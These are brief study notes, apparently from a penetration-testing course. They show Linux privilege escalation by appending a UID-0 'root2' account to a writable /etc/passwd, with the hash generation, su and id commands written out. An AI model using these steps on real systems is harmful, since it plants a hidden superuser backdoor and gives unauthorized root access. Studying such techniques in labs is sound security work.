add another super user "root2"

student@debian:~$ openssl passwd evil
----> generated hash password for user

student@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
----> As shown in Listing 586, the “root2” user and the password hash in our /etc/passwd record were
followed by the user id (UID) zero and the group id (GID) zero. These zero values specify that the
account we created is a superuser account on Linux. Finally, in order to verify that our modifications
were valid, we used the su command to switch our standard user to the newly created root2
account and issued the id command to show that we indeed had root privileges.

student@debian:~$ su root2

root@debian:/home/student# id
---> to show that we have root priv
